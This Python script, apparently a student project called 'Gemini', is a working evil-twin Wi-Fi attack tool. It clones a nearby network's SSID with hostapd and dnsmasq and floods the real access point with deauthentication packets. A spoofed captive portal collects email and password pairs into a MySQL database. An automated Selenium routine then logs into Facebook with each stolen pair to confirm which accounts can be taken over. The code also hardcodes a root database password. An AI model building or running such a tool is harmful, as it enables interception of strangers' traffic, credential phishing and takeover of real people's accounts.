#!/usr/bin/python
import os
os.system('pip install functools32')
os.system('pip install selenium')
import itertools
import threading
import time
from tqdm import tqdm
import sys
import MySQLdb
from datetime import date
import operator
import functools
import string
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.options import Options


#FUNC ANIMATION LOADING INTERFACE#
done = False
def animate():
    for c in itertools.cycle(['|', '/', '-', '\\']):
        if done:
            break
        sys.stdout.write('\rLOADING ' + c)
        sys.stdout.flush()
        time.sleep(0.1)

t = threading.Thread(target=animate)
t.start()

#long process here
time.sleep(3)
done = True


while True:
    os.system('clear')
    today = date.today()
    animate()
    print("""                                                                             
           @%%####%%@             %%%%%%%%%%%%%%%     %&@           (*            &/,,       /,,,,,      ,*%               ,,,,,      ,,,,,
       %#################@        ###############     %######&               @*,,,,,,,       /,,,,,      ,,,,,,*           ,,,,,      ,,,,,
    @######################&      ###############     %#########%          /,,,,,,,,,,       /,,,,,      ,,,,,,,,,/        ,,,,,      ,,,,,
   ########          #######      #####               %############      ,,,,,,,,,,,,,       /,,,,,      ,,,,,,,,,,,,&     ,,,,,      ,,,,,
 ######               ##         #####                %#############%  #,,,,,,,,,,,,,,       /,,,,,      ,,,,,,,,,,,,,,&   ,,,,,      ,,,,,
%######                          @#####               %#####  ########,,,,,,,*   ,,,,,       /,,,,,      ,,,,,  ,,,,,,,,,  ,,,,,      ,,,,,
######                           @#####               %#####    ######,,,,,,     ,,,,,       /,,,,,      ,,,,,    ,,,,,,,, ,,,,,      ,,,,,
#####                            @###############     %#####      ####,,,,       ,,,,,       /,,,,,      ,,,,,      ,,,,,,,,,,,,      ,,,,,
#####                  %%%%%     @###############     %#####       ###,,,        ,,,,,       /,,,,,      ,,,,,        ,,,,,,,,,,      ,,,,,
#####                  #####     @###############     %#####         #,/         ,,,,,       /,,,,,      ,,,,,         (,,,,,,,,      ,,,,,
#####%                 #####     @#####               %#####         #/          ,,,,,       /,,,,,      ,,,,,          (,,,,,,,      ,,,,,
######%                #####     ####                 %#####                     ,,,,,       /,,,,,      ,,,,,            ,,,,,,      ,,,,,
 #######               #####     ####                 %#####                     ,,,,,       /,,,,,      ,,,,,             ,,,,,      ,,,,,
  @#######%          @%#####     ####                 %#####                     ,,,,,       /,,,,,      ,,,,,              ,,,,      ,,,,,
    ############%###########     ##############       %#####                     ,,,,,       /,,,,,      ,,,,,               (,,      ,,,,,
       ###################       ##############       %#####                     ,,,,,       /,,,,,      ,,,,,                 ,      ,,,,, """)
    
    
    choice = 0
    print("\n1.Install Requirement")
    print("2.Start Gemini")
    print("3.Validate Data")
    print("4.Opening Log")
    print("5.Exit\n")
    choice = raw_input("Choose : ")
    if choice == "1":
        os.system('clear')
        print("Updating configuration. . .")
        os.system('apt-get update')
        os.system('apt-get upgrade')
        os.system('apt-get install python-pip')
        os.system('apt install hostapd dnsmasq')
        os.system('apt-get install -y python-tqdm')
        os.system('pip install functools32')
        os.system('pip install selenium')
        os.system('clear')
        os.system('mkdir ~/EvilTwin')

        #DNSMSQ CONFIG
        #################################################################################################
        print("[+] Setting up dnsmasq configuration..")
        for i in tqdm(range(3)):
            time.sleep(1)
        os.system('rm -f -- ~/EvilTwin/dnsmasq.conf')
        os.system('echo "interface=wlan1mon \ndhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h \ndhcp-option=3,192.168.1.1 \ndhcp-option=6,192.168.1.1 \nserver=8.8.8.8 \nlog-queries \nlog-dhcp \nlisten-address=127.0.0.1" >> ~/EvilTwin/dnsmasq.conf')
        print('Dnsmasq configuration success ..')

        #APACHE 2 CONFIG
        ##################################################################################################
        print("\n[+] Setting up apache2 configuration ..")
        for i in tqdm(range(3)):
            time.sleep(1)
        os.system('rm /etc/apache2/sites-enabled/*')
        os.system('echo "<VirtualHost *:80> \n\n    Servername connectivitycheck.gstatic.com\n    ServerAdmin webmaster@localhost\n    DocumentRoot /var/www/html/android\n\n    RedirectMatch 302 /generate_204 /index.html\n    ErrorLog \${APACHE_LOG_DIR}/android_error.log\n    CustomLog \${APACHE_LOG_DIR}/android_access.log combined\n\n</VirtualHost>" >> /etc/apache2/sites-enabled/android.conf')
        print('Apache2 configuration success')
        
        #WEB PAGE CONFIG
        print('\n[+] Setting web page configuration .. ')
        #if(os.path.exists("/var/www/html/android/")):
        #    os.system('rm -r /var/www/html/android/')
        os.system('mkdir /var/www/html/android')
        #if(os.path.exists("~/EvilTwin/CBN")):
        #    os.system('rm -r ~/EvilTwin/CBN')
        #os.system('git clone https://github.com/rvn9/Gemini.git ~/EvilTwin/CBN')
        #os.system('tar xvzf ~/EvilTwin/CBN/CBNWifi.tar.gz --directory ~/EvilTwin/CBN')
        #os.system('mv ~/EvilTwin/CBN/var/www/html/android/* /var/www/html/android ')
        #os.system('rm -r ~/EvilTwin/CBN/')

        #INSTALLING GECKODRIVER
        print('\n[+] Installing Geckodriver .. ')
        if os.path.exists("/usr/local/bin/geckodriver/"):
            print('Geckodriver alredy installed')
        else: 
            os.system('curl -X GET https://github.com/mozilla/geckodriver/releases/download/v0.26.0/geckodriver-v0.26.0-linux32.tar.gz -L --output ~/EvilTwin/geckodriver.tar.gz')
            os.system('tar xvzf ~/EvilTwin/geckodriver.tar.gz --directory /usr/local/bin/')
            os.system('rm ~/EvilTwin/geckodriver.tar.gz')

        #DATABASE CONFIG
        ###################################################################################################
        print("\n[+] Setting up Database configuration ..")
        os.system('service mysql start')
        for i in tqdm(range(3)):
            time.sleep(1)
        #Root password name    
        if os.path.exists("/var/lib/mysql/rogue_AP"):
            overwriteDB = raw_input("Rogue_AP DB found, do yout want to overwrite : ")
            if(overwriteDB == 'y' or overwriteDB == 'y'):
                pName = raw_input("Enter your root password : ")
                mydb = MySQLdb.connect(host = 'localhost',user = 'root',passwd = pName)
                cur = mydb.cursor()
                cur.execute('drop user IF EXISTS \'fakeap\'@\'localhost\'')
                cur.execute('drop database IF EXISTS rogue_AP')
                cur.execute('create database rogue_AP')
                cur.execute('CREATE USER \'fakeap\'@\'localhost\' IDENTIFIED BY \'fakeap\'')
                cur.execute('use rogue_AP')
                cur.execute('create table users(email varchar(32), password varchar(32))')
                cur.execute('create table valid(email varchar(32), password varchar(32))')
                cur.execute('grant all privileges on rogue_AP.* to \'fakeap\'@\'localhost\';')
                print('Database configuration success ..')
        else : 
            print('Database rogue_AP alredy found / created !')
    
        print("Requirement Completed!")

        nothing  = raw_input("\nPress enter to continue ")
    
    elif choice == "2":
        os.system('clear')
        print("[+] Starting GEMINI  . . .")
        os.system('iwconfig')
        #wName = Wireless adapter Name
        while True:
            wName = raw_input("Enter Wireless Adapter Name (suggested wlan1): ")
            check = os.popen('ifconfig').read()	
            if (wName in str(check) and wName[:4] == 'wlan' and wName[4:].strip().isdigit()):
                print("\n[+] There is the "+wName)
                wName2 = raw_input("\nEnter Wireless Adapter Name for Deauthentication (suggested wlan2) : ")
                check = os.popen('ifconfig').read()	
                if (wName2 in str(check) and wName2[:4] == 'wlan' and wName2[4:].strip().isdigit()):
                    print("\n[+] There is the "+wName2)
                    break;
                else:
                    print("There is no interface" + wName2)
            else:
                print("There is no interface" + wName)

            wName2 = raw_input("Enter Wireless Adapter Name : ")
            

        #TURNING ON MONITOR MODE 
        os.system('airmon-ng start ' + wName)
        time.sleep(2)
        os.system('clear')

        #HOSTAPD CONFIG
        #################################################################################################
        print("[+] Setting up hostapd configuration..")
        for i in tqdm(range(3)):
            time.sleep(1)
        print("press ctrl-c once you see the wifi you want to copy !! ")
        time.sleep(3)
        #sName = SSID NAME 
        #cNama = Channel number
        #bName = BSSID number
        os.system('rm -f -- ~/EvilTwin/hostapd.conf')
        os.system("airodump-ng "+wName+'mon')
        sName = raw_input("Enter SSID  Name : ")
        cName = raw_input("Enter Channel    : ")
        bName = raw_input("Enter BSSID      : ")
        os.system('airmon-ng start ' + wName2 + " " +cName)
        os.system('echo "interface=wlan1mon\ndriver=nl80211\nssid="' + sName +'"\nhw_mode=g\nchannel="' + cName + '"\nmacaddr_acl=0\nignore_broadcast_ssid=0" >> ~/EvilTwin/hostapd.conf')
        print('Hostapd configuration success ..')

        #SETTING IP TABLES
        print("\n[+] Setting up IP Tables ..")
        #ANIMATION Setting UP iptables#
        for i in tqdm(range(3)):
            time.sleep(1)
        os.system('ifconfig wlan1mon up 192.168.1.1 netmask 255.255.255.0')
        os.system('route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1')
        os.system('iptables --table nat --append POSTROUTING --out-interface wlan0 -j MASQUERADE')
        os.system('iptables --append FORWARD --in-interface wlan1mon -j ACCEPT')
        os.system('iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80')
        os.system('iptables -t nat -A POSTROUTING -j MASQUERADE')
        os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
        time.sleep(2)

        #SETTING APACHE2
        print("\n[+] Starting up Apache2..")
        for i in tqdm(range(3)):
            time.sleep(1)
        os.system('service mysql start')
        os.system('service apache2 start')
        os.system('sudo a2enmod rewrite')
        os.system('service apache2 reload')
        print('Setting up apache2 complete ..')
        os.system('killall dnsmasq')
        os.system('clear')
        print('[+]Opening 3 tab')
        for i in tqdm(range(3)):
            time.sleep(1)
        print('1st tab for hostapd')
        print('2nd tab for dnsmasq')
        print('3rd tab for deauthentication')
        time.sleep(5)
        
        #Starting Fake AP
        os.system('gnome-terminal --tab -- sh -c "hostapd ~/EvilTwin/hostapd.conf;  bash"')
        #TURNING UP DNSMASQ 
        os.system('gnome-terminal --tab -- sh -c "dnsmasq -C ~/EvilTwin/dnsmasq.conf -d;  bash"')
        #SENDING DEAUTH
        os.system('gnome-terminal --tab -- sh -c "aireplay-ng -0 2000 -a' + bName + " " + wName2 + 'mon; bash"')

        
    elif choice == "4":
        #PRINTING LOG
        os.system('service mysql start')
        if os.path.exists("/var/lib/mysql/rogue_AP"):
            mydb = MySQLdb.connect(host = 'localhost',user = 'root',passwd = 'toor',db = 'rogue_AP')
            cur = mydb.cursor()
            print("[+] Opening Database ..")
            log_type = raw_input("Do you want to see validated data ? Y / N : ")
            log_file = raw_input("Do you want to print the log file ? Y / N : ")
            ## LOG UNVALIDATED DATA
            if log_type == 'n' or log_type =='N':
                
                if log_file == 'y' or log_file == 'Y':
                    if(os.path.exists("/tmp/hasil.txt")):
                        os.system('rm /tmp/hasil.txt')
                    command = cur.execute('SELECT * FROM users INTO OUTFILE \'/tmp/hasil.txt\' ')
                    os.system('chmod 777 /tmp/hasil.txt')
                    os.system('cp /tmp/hasil.txt  ~/EvilTwin/' + str(today)+'_UNVALIDATED')
                    print('Log file succesfully written to ~/EvilTwin/' + str(today)+'_UNVALIDATED')
                    os.system('gedit ~/EvilTwin/' + str(today)+'_UNVALIDATED')
                    time.sleep(1)
                elif log_file == 'n' or log_file == 'N':
                    command = cur.execute('SELECT * FROM users')
                    results2 = cur.fetchall()
                    os.system('clear')
                    print('====================================================================')
                    print('                      Unvalidated Data Log file   ')
                    print('====================================================================\n')
                    print('Showing each record')
                    for row in results2 : 
                        print("Email = " + row[0] +  " | " + "Password = " + row[1])

            ## LOG VALIDATED DATA ##
            elif log_type == 'y' or log_type =='Y':   
                
                if log_file == 'y' or log_file == 'Y':
                    if(os.path.exists("/tmp/hasil.txt")):
                        os.system('rm /tmp/hasil.txt')
                    command = cur.execute('SELECT * FROM valid INTO OUTFILE \'/tmp/hasil.txt\' ')
                    os.system('chmod 777 /tmp/hasil.txt')
                    os.system('cp /tmp/hasil.txt  ~/EvilTwin/' + str(today)+'_VALIDATED')
                    print('Log file succesfully written to ~/EvilTwin/' + str(today)+'_VALIDATED')
                    os.system('gedit ~/EvilTwin/' + str(today)+'_VALIDATED')
                    time.sleep(1)
                elif log_file == 'n' or log_file == 'N':
                    command = cur.execute('SELECT * FROM valid')
                    results2 = cur.fetchall()
                    os.system('clear')
                    print('====================================================================')
                    print('                       Validated Data Log file  ')
                    print('====================================================================\n')
                    print('Showing each record')
                    for row in results2 : 
                        print("Email = " + row[0] +  " | " + "Password = " + row[1])

        else:
            print('DATABASE NOT FOUND !!')

        nothing  = raw_input("\nPress enter to continue ")

    elif choice == "3":
        os.system('service mysql start')
        if os.path.exists("/var/lib/mysql/rogue_AP"):
            print('[+] Validating Data')
            print('This process may take some time depending on how many data in database & your internet connection.')
            #FUNC VALIDATE
            def add(idn,pw):
                mydb = MySQLdb.connect(host = 'localhost',user = 'root',passwd = 'toor',db = 'rogue_AP')
                mycursor = mydb.cursor()
                val = idn
                sql_select_query = """select * from valid where email = %s"""
                mycursor.execute(sql_select_query, (val,))

                results = mycursor.fetchall()
                if (len(results) == 0):
                    sql = """INSERT INTO valid (email, password) VALUES (%s, %s)"""
                    mycursor.execute(sql, (idn, pw))
                    #mycursor.execute(sql)
                mydb.commit() 

            def check(idn,pw):
                options = Options()
                options.headless = True
                browser = webdriver.Firefox(executable_path="/usr/local/bin/geckodriver")
                #browser = webdriver.Firefox(options=options, executable_path="/usr/local/bin/geckodriver")
                browser.get("https://www.facebook.com/")
                username = browser.find_element_by_name('email')
                username.send_keys(idn)
                password = browser.find_element_by_name('pass')
                password.send_keys(pw)
                password.send_keys(Keys.ENTER)
                time.sleep(3)
                url = browser.current_url
                title = browser.title
                idn = functools.reduce(operator.add, (idn))
                pw = functools.reduce(operator.add, (pw))
                if url == "https://web.facebook.com/"  or url == "https://www.facebook.com/" or url == "https://www.facebook.com/" :
                    add(idn,pw)
                if title == "Facebook" :
                    add(idn,pw)

            mydb = MySQLdb.connect(host = 'localhost',user = 'root',passwd = 'toor',db = 'rogue_AP')
            cur = mydb.cursor()
            wew = "SELECT email FROM users"
            cur.execute(wew)
            results = cur.fetchall()
            x = 0

            email =[]

            for hasil in results:	
                email.append(hasil)
                # username[x]= hasil	 	
                x +=1	

            wow = "SELECT password FROM users"
            cur.execute(wow)
            results = cur.fetchall()
            password = []
            x=0
            for hasil in results:
                password.append(hasil)
                # password[x] = hasil	
                x +=1
            i=0

            for i in range(0,x):
                idn = email[i]
                pw = password[i]
                check(idn,pw)
                
            print("VALIDATE SUCCES !!")
        else:
            print('DATABASE NOT FOUND !!')
        
        nothing  = raw_input("\nPress enter to continue ")

    elif choice == "5":
        os.system('clear')
        print("""
          _____                _           _   ____        
         / ____|              | |         | | |  _ \       
        | |     _ __ ___  __ _| |_ ___  __| | | |_) |_   _ 
        | |    | '__/ _ \/ _` | __/ _ \/ _` | |  _ <| | | |
        | |____| | |  __/ (_| | ||  __/ (_| | | |_) | |_| |
         \_____|_|  \___|\__,_|\__\___|\__,_| |____/ \__, |
                                                      __/ |
                                                     |___/                                                                                      
        """)
        print('                            <th380is>                \n')
		
       
        print('           |Andreas Agustinus      -     00000019633|')
        print('           |Steven  Wijaya         -     00000020163|')
        print('           |Steve Manumpil         -     00000021768|')
        print('           |Djasen Tjendry         -     00000025138|')
        print('\n                     THANKS FOR USING GEMINI\n')

        time.sleep(3)
        os.system('killall dnsmasq')
        os.system('killall hostapd')
        os.system('service NetworkManager restart')
        os.system('clear')
        exit()
